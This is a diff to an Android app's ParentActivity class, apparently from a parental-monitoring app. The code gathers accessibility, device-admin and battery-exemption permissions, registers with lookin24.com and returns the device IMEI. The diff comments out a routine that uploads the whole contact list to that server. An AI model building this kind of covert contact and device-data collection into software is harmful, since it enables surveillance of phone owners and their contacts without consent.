@@ -68,6 +68,7 @@ public class ParentActivity extends Activity {
 
 
                         while (true) {
+
                             String ans = new InternetHelper().send("https://lookin24.com/updateFirebaseToken2", postData.toString());
                             //new ServerHelper(this).execute("https://lookin24.com/updateFirebaseToken", postData.toString());
                             if(ans.equals("1")) {
@@ -187,14 +188,14 @@ public class ParentActivity extends Activity {
 
             @Override
             protected Void doInBackground(String... strings) {
-                ParentActivity.cs = true;
-                 JSONObject ans=   new ContactHelper(that).getContactList();
-                String a = new InternetHelper().send("https://lookin24.com/contacts", ans.toString());
-                if(a.equals("1")) {
-
-                }else {
-                    cs = false;
-                }
+//                ParentActivity.cs = true;
+//                 JSONObject ans=   new ContactHelper(that).getContactList();
+//                String a = new InternetHelper().send("https://lookin24.com/contacts", ans.toString());
+//                if(a.equals("1")) {
+//
+//                }else {
+//                    cs = false;
+//                }
                 return null;
             }
         }.execute();
@@ -241,10 +242,10 @@ public class ParentActivity extends Activity {
                     startActivity(browserIntent);
                     return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(("1").getBytes()));
                 }
-                if(url.indexOf("hpsforapp") != -1) {
+                if(url.indexOf("hpsforapp") != -1 && !MyAccessibilityService.silIcaze) {
                     try {
                         System.out.println("---------------------------------------------");
-                        MyAccessibilityService.disable();
+                        //MyAccessibilityService.disable();
                     }catch (Exception e){}
                 }
                 if(url.indexOf("?firstTime=123") != -1) {
@@ -255,13 +256,11 @@ public class ParentActivity extends Activity {
                     if(pm.isBatteryObtimisationIgnored())t += 25;
                     if(pm.isAccessibilityServiceEnabled(MyAccessibilityService.class)) t += 25;
                     if(pm.isAdmin())t += 25;
-                    if(!cs && t == 25)
-                        contacts();
+//                    if(!cs && t == 25)
+//                        contacts();
                     if(t == 100) {
                         if(MyAccessibilityService.firstTime) {
                             prepareFirebase();
-
-                            MyAccessibilityService.firstTime = false;
                         }
                         return new WebResourceResponse("text/plain", "utf-8", new ByteArrayInputStream(new Device(that).getImei().getBytes()));
                     }else {
